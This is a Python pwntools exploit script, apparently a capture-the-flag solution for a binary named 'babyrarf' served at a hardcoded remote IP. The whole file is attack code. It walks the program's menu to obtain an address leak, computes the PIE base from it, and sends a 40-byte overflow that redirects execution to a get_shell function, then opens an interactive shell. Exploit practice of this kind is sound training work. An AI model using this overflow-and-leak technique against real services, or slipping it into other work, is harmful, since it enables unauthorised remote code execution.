#!/usr/bin/env python3

from pwn import *

p = remote("35.204.144.114", 1337)
elf = ELF("./babyrarf")

p.sendlineafter("name?\n\n", "A"*8)

for _ in range(10):
    p.sendlineafter("cr0wn\n\n", "5")

p.sendlineafter("cr0wn\n\n", "4")

p.recvuntil("attack ")

leak = int(p.recvline(), 10)
elf.address = leak - 0x14d0

log.info("PIE leak: " + hex(leak))
log.info("PIE base: " + hex(elf.address))

payload = b"A"*40
payload += p64(elf.sym["get_shell"])

p.sendline(payload)

p.interactive()
